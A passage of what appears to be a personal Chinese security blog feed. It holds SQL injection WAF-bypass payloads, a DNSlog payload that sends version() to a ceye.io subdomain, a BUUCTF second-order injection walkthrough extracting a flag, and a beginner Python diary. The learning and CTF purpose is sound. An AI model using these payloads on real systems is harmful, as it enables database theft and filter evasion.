title="1.WAF分类"></a>1.WAF分类</h4><p>&emsp;&emsp;从解析层面的角度上，WAF可以分为嵌入型与非嵌入型，非嵌入型是指硬件型WAF、云WAF、软件型WAF之类的，它们对Web流量的解析完全是靠自身的；而嵌入型是指网站内置的WAF，它们拿到的Web数据是已经被解析加工好的。因此非嵌入型WAF的受攻击角度会涉及到其他的层面，而嵌入型WAF从Web容器模块型WAF、代码层WAF越往下走，其对抗畸形报文、扫操作的能力就越来越强，与此同步增加的还有部署维护的成本。</p><p>&emsp;&emsp;（以下图片举例中的图片来源于小迪安全课程，俺没钱高那么多服务器咧）</p><ul><li>阿里云盾（阿里云服务器自带）</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87/2.jpg" style="zoom:80%;" /></center><ul><li>宝塔（一键化搭建工具，许多非法网站都喜欢用）</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87/3.jpg" style="zoom:80%;" /></center><ul><li>安全狗（免费的并且出得比较早的）</li></ul><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87/4.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-WAF防御原理"><a href="#2-WAF防御原理" class="headerlink" title="2.WAF防御原理"></a>2.WAF防御原理</h4><p>&emsp;&emsp;简单而言，WAF针对与SQL注入的办法。就是解析HTTP的请求，检测HTTP请求中的参数是否存在恶意的攻击行为。如果在请求的参数当中存在和WAF规则库相匹配的字段，则WAF需要判断该请求是否为攻击行为，并进行阻断或者放行的操作。</p><p>&emsp;</p><h4 id="3-绕过方法——架构层面："><a href="#3-绕过方法——架构层面：" class="headerlink" title="3.绕过方法——架构层面："></a>3.绕过方法——架构层面：</h4><p>&emsp;&emsp;WAF作为访问的过滤器，本身不一定是嵌入在Web网页当中，所以我们可以从架构的层面上考虑对其的绕过</p><ul><li>查找真实IP：</li></ul><p>&emsp;&emsp;当用户本身是进入WAF后才访问的WEB网页，那么只要我们找到该网页的真实IP，那么绕过WAF也是轻而易举的事情了</p><ul><li>加入到内部服务器：</li></ul><p>&emsp;&emsp;在同网段中，网页与网页健，服务器与服务器之间是拥有这WAF防护的，如果我们能够在内部服务器之间进行访问，也是有可能实现绕过的</p><ul><li>SSRF请求伪造</li></ul><p>&emsp;&emsp;我们可以通过边界的漏洞，利用已知服务器存在的SSRF漏洞，将数据直接发送到同网段的WEB页面中进行SQL注入</p><p>&emsp;</p><h4 id="4-绕过方法——限度层面："><a href="#4-绕过方法——限度层面：" class="headerlink" title="4.绕过方法——限度层面："></a>4.绕过方法——限度层面：</h4><p>&emsp;&emsp;这个会比较好理解，有的WAF检测数据量是有限的，如果数据过大，会导致WAF无法将所有的数据都检测完，这样子就会检测不到我们写入的SQL注入语句，从而绕过WAF。如使用POST请求，对服务器请求进行很大资源的注入（注意：有些输入可能会有限制，所以不一定能实现）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>&quot;liaoyue&quot;  <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)<span class="hljs-operator">=</span>(<span class="hljs-keyword">Select</span> <span class="hljs-number">0xA</span><span class="hljs-operator">*</span><span class="hljs-number">1000</span>) <span class="hljs-keyword">uNiOn</span> <span class="hljs-keyword">SeLeCt</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,version();<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="5-绕过方法——协议层面"><a href="#5-绕过方法——协议层面" class="headerlink" title="5.绕过方法——协议层面"></a>5.绕过方法——协议层面</h4><ul><li>更改提交方式：</li></ul><p>&emsp;&emsp;基于协议层,有些WAF考虑到性能等方面，只对部分提交方式进行了过滤，比如当WAF只过滤了GET请求时，我们可以将GET类型转化为POST类型达到绕过的目的</p><ul><li>参数污染：</li></ul><p>&emsp;&emsp;当我们使用浏览器与服务器进行交互的时候，参数往往会显示在GET或POST的请求包当中，参数的的形式也是名称+值的形式。一般而言，参数的名称都是单独一份，但在HTTP协议中却允许出现多个同名的参数。比如对于：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://www.baidu.com?name=liao &amp; name=yue  <br></code></pre></td></tr></table></figure><p>&emsp;&emsp;面对这种同样的参数出现多次的情况下，不同的服务器会有不同的处理办法。有的服务器是选取第一个参数，有的是选取第二个参数，也有的服务器是全都要，这种特性在绕过一些服务器端的逻辑判断就非常有用的</p><table><thead><tr><th>web服务器</th><th>参数获取函数</th><th>获取的结果</th></tr></thead><tbody><tr><td>PHP/Apache</td><td>$_GET(“par”)</td><td>Last</td></tr><tr><td>JSP/Tmocat</td><td>Request.getParameter(“par”)</td><td>First</td></tr><tr><td>Perl（CGI）/Apache</td><td>Param(“par”)</td><td>First</td></tr><tr><td>Python/Apache</td><td>Getvalue(“par”)</td><td>All（List）</td></tr><tr><td>ASP/IIS</td><td>Request.QueryString(“par”)</td><td>All(comma-delimited string)</td></tr></tbody></table><h4 id="6-绕过方法——语法规则层面"><a href="#6-绕过方法——语法规则层面" class="headerlink" title="6.绕过方法——语法规则层面"></a>6.绕过方法——语法规则层面</h4><p>&emsp;&emsp;以下方法并不全面，还需要积累更多的办法</p><ul><li>大小写混合：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;liaoyue&#x27;</span> <span class="hljs-keyword">uNioN</span> <span class="hljs-keyword">SeleCt</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;这是比较初级的绕过方式，一般来说，很难起到作用，但是也可以尝试。</p><ul><li>解密编码：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>&quot;liaoyue&quot; <span class="hljs-keyword">union</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>Aselect<span class="hljs-operator">%</span><span class="hljs-number">0</span>A1,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><ul><li>注释符混用：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>&quot;liaoyue&quot; <span class="hljs-comment">/*!union*/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><ul><li>等价函数替换：</li></ul><p>&emsp;&emsp;比如用@@version替换version（），用@@datadir替换datadir（）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>&quot;liaoyue&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">5</span>,<span class="hljs-number">3</span>)),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><ul><li>特殊符号混用：</li></ul><table><thead><tr><th align="center">+</th><th align="center">#</th><th align="center">%23</th><th align="center">–+</th><th align="center">\\</th><th align="center">‘</th><th align="center">@</th></tr></thead></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>&quot;liaoyue&quot; <span class="hljs-keyword">union</span><span class="hljs-operator">+</span><span class="hljs-keyword">select</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><ul><li>mysql黑魔法</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span>&#123;xusername&#125;<span class="hljs-keyword">from</span>&#123;x11test.admin&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>借助数据库特性：</p><ul><li><p>mysql黑魔法</p><p>&emsp;&emsp;&emsp;select{xusername}from{x11test.admin};</p></li><li><p>SQLServer技巧</p><p>（1）用来注释掉注射后查询的其余部分：</p><p>&emsp;&emsp;&emsp;/*C语言风格注释</p><p>&emsp;&emsp;&emsp;SQL注释</p><p>&emsp;&emsp;&emsp;;00％空字节</p><p>（2）空白符：[0x01-0x20]</p><p>（3）特殊符号：%3a冒号</p><p>&emsp;&emsp;&emsp;id=1union:select1,2from:admin</p><p>（4）函数变形：如db_name 空白字符</p></li><li><p>Oracle技巧</p><p>（1）注释符：–、/**/</p><p>（2）空白字符：[0x00,0x09，0x0a-0x0d,0x20]</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——DNSlog注入</title>
    <link href="/2022/08/27/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94DNSlog%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/27/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94DNSlog%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——DNSlog注入"><a href="#SQL注入——DNSlog注入" class="headerlink" title="SQL注入——DNSlog注入"></a>SQL注入——DNSlog注入</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;在SQL注入选择布尔注入、时间盲注、注入的效率很低占用线程高还很容易被waf进行拦截，不仅如此，在目标重点没有明显回显的情况下，我们在读取文件、执行命令注入等操作时无法很好的确实是否利用成功，这时候就需要利用到DNSlog注入了。</p><p>&emsp;&emsp;前面也就介绍过所谓的DNS就是将域名解释为ip地址，当用户在浏览器输入一个域名A.com时，DNS就会将该域名解析到其所对应的ip地址127.0.0.1中。而DNSlog就是存储在DNS服务器上的域名信息，它记录着用户对域名baidu.com等的访问信息，类似日志文件一样的东西。如遇到MySql的盲注时，可以利用内置函数load_file()来完成DNSlog。load_file()不仅能够加载本地文件，同时也能对诸如\<a href="http://www.test.com/">www.test.com</a>这样的URL发起请求。</p><p>&emsp;&emsp;注入语句示范：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span><span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> if((<span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> version()),<span class="hljs-string">&#x27;.oi2yec.ceye.io\\abc&#x27;</span>))),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)#; <br></code></pre></td></tr></table></figure><p>&emsp;</p><p>&emsp;&emsp;（淦，pycharm的python2版本下不来DNSlog工具的库，解决了一天都没搞定，等有空吧环境放在虚拟机里面运行吧）</p><h4 id="1-涉及相关链接网址："><a href="#1-涉及相关链接网址：" class="headerlink" title="1.涉及相关链接网址："></a>1.涉及相关链接网址：</h4><ul><li><a href="http://ceye.io/">http://ceye.io</a></li><li><a href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——二次注入</title>
    <link href="/2022/08/23/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/23/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——二次注入"><a href="#SQL注入——二次注入" class="headerlink" title="SQL注入——二次注入"></a>SQL注入——二次注入</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;二次注入是典型的存储类型注入，当在洁面奶有登录等交互界面时，我们可以构造恶意数据存储在数据库中，当第二次调用恶意数据时，该内容会被读取并执行SQL的查询语句，从而造成注入攻击。</p><p>&emsp;&emsp;注：这里有时候在输入上会纯在字符的长度限制，如果是咋前端，我们可以使用</p><h4 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h4><p>&emsp;&emsp;第一步：插入恶意数据</p><p>&emsp;&emsp;第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p><p>&emsp;&emsp;第二步：引用恶意数据</p><p>&emsp;&emsp;在将数据存入到了数据库中之后，开发者就认为数据是可信的了（比较有提前筛选），在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这就形成了最终的SQL二次注入。</p><h4 id="2-注入尝试"><a href="#2-注入尝试" class="headerlink" title="2.注入尝试"></a>2.注入尝试</h4><p>&emsp;&emsp;这里以BUUCTF–October 2019 Twice SQL Injection的作为演示例子，当我们打开界面时间纯在用户登录界面，尝试使用进行登录界面注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/1.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，尝试注入失败，并没有任何的反馈。</p><p>&emsp;</p><h4 id="3-注册"><a href="#3-注册" class="headerlink" title="3.注册"></a>3.注册</h4><p>&emsp;&emsp;查看到有注册界面，点击进行注册尝试，用户采用admin’#，密码随意：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/2.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;登录之后的界面,显然是没有回显的：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/3.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;其实在前面也有提到过，在</p><p>&emsp;</p><h4 id="4-注册爆出数据库名"><a href="#4-注册爆出数据库名" class="headerlink" title="4.注册爆出数据库名"></a>4.注册爆出数据库名</h4><p>&emsp;&emsp;尝试使用二次注入的办法注册：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-string">&#x27; union select database() #</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;登录：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/5.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="5-注册爆出权限"><a href="#5-注册爆出权限" class="headerlink" title="5.注册爆出权限"></a>5.注册爆出权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-string">&#x27; union select user()#</span><br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/6.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;登录：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/7.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-注册爆出表名"><a href="#6-注册爆出表名" class="headerlink" title="6.注册爆出表名"></a>6.注册爆出表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-string">&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctftraining<span class="hljs-string">&#x27; #</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;登录：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/8.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-注册爆出列名"><a href="#7-注册爆出列名" class="headerlink" title="7.注册爆出列名"></a>7.注册爆出列名</h4><p>&emsp;&emsp;看见有flag，直接兴奋</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-string">&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;登录：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/9.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8-注册爆出列的内容"><a href="#8-注册爆出列的内容" class="headerlink" title="8.注册爆出列的内容"></a>8.注册爆出列的内容</h4><p>&emsp;&emsp;可恶，有够麻烦的，怎么还有一层</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">liaoyue<span class="hljs-string">&#x27; union select flag from flag #</span><br></code></pre></td></tr></table></figure><p>&emsp;&emsp;登录：</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/10.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;搞定，收工咧</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python日记（三）</title>
    <link href="/2022/08/23/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2022/08/23/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Python日记（三）"><a href="#Python日记（三）" class="headerlink" title="Python日记（三）"></a>Python日记（三）</h1><h4 id="1-if结构"><a href="#1-if结构" class="headerlink" title="1.if结构"></a>1.if结构</h4><ul><li><h6 id="if"><a href="#if" class="headerlink" title="if"></a>if</h6></li></ul><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/1.jpg" style="zoom:80%;" /></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>liaoyue = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请给撩月打分：&quot;</span>))<br><br><span class="hljs-keyword">if</span> liaoyue &gt;= <span class="hljs-number">85</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不敢当不敢当&quot;</span>)<br><br><span class="hljs-keyword">if</span> liaoyue &lt; <span class="hljs-number">60</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;你干嘛~哎呦&quot;</span>)<br><br><span class="hljs-keyword">if</span> (liaoyue &gt;= <span class="hljs-number">60</span>) <span class="hljs-keyword">and</span> (liaoyue &lt; <span class="hljs-number">85</span>):<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;指定没你好果汁吃！&quot;</span>)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/2.jpg" style="zoom:80%;" /></center><p>&emsp;</p><ul><li><h6 id="if-else"><a href="#if-else" class="headerlink" title="if -else"></a>if -else</h6></li></ul><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/3.jpg" style="zoom:80%;" /></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>liaoyue = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请给撩月打分：&quot;</span>))<br><br><span class="hljs-keyword">if</span> liaoyue &gt;= <span class="hljs-number">85</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不敢当不敢当&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;你干嘛~哎呦&quot;</span>)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/4.jpg" style="zoom:80%;" /></center><p>&emsp;</p><ul><li><h6 id="if-elif-else"><a href="#if-elif-else" class="headerlink" title="if-elif-else"></a>if-elif-else</h6></li></ul><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/5.jpg" style="zoom:80%;" /></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>liaoyue = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请给撩月打分：&quot;</span>))<br><br><span class="hljs-keyword">if</span> liaoyue &gt;= <span class="hljs-number">90</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不敢当不敢当&quot;</span>)<br><span class="hljs-keyword">elif</span> liaoyue &gt;= <span class="hljs-number">80</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;还行还行&quot;</span>)<br><span class="hljs-keyword">elif</span> liaoyue &gt;= <span class="hljs-number">70</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;咋地，对我有意见啊&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;你干嘛~哎呦&quot;</span>)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/6.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-while语句"><a href="#2-while语句" class="headerlink" title="2.while语句"></a>2.while语句</h4><p>（注：只有Python中的while循环是跟有else的，目前的其他语言是没有的）</p><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/7.jpg" style="zoom:80%;" /></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i * i &lt; <span class="hljs-number">1000</span>:<br>    i +=<span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;i = &quot;</span>, i)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;i * i =&quot;</span>, i*i)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/8.jpg" style="zoom:80%;" /></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i * i &lt; <span class="hljs-number">10</span>:<br>    i +=<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;*&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;=&#x27;</span>,i*i)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;over&quot;</span>)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/9.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-For循环语句"><a href="#3-For循环语句" class="headerlink" title="3.For循环语句"></a>3.For循环语句</h4><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/10.jpg" style="zoom:80%;" /></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;——————字符串——————&quot;</span>)<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;liaoyue&#x27;</span>:<br>    <span class="hljs-built_in">print</span> (item)<br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;——————列表——————&quot;</span>)<br>numbers = [<span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>]<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> numbers:<br>    <span class="hljs-built_in">print</span> (item)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/11.jpg" style="zoom:80%;" /></center><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span> (item)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;over&quot;</span>)<br></code></pre></td></tr></table></figure><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/12.jpg" style="zoom:80%;" /></center>&emsp;<h4 id="4-跳转语句"><a href="#4-跳转语句" class="headerlink" title="4.跳转语句"></a>4.跳转语句</h4><ul><li>break语句</li></ul><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/13.jpg" style="zoom:80%;" /></center><ul><li>continue语句</li></ul><center><img src="/img/Python%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/14.jpg" style="zoom:80%;" /></center><ul><li>return语句</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>盲注——时间型</title>
    <link href="/2022/08/22/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E5%9E%8B/"/>
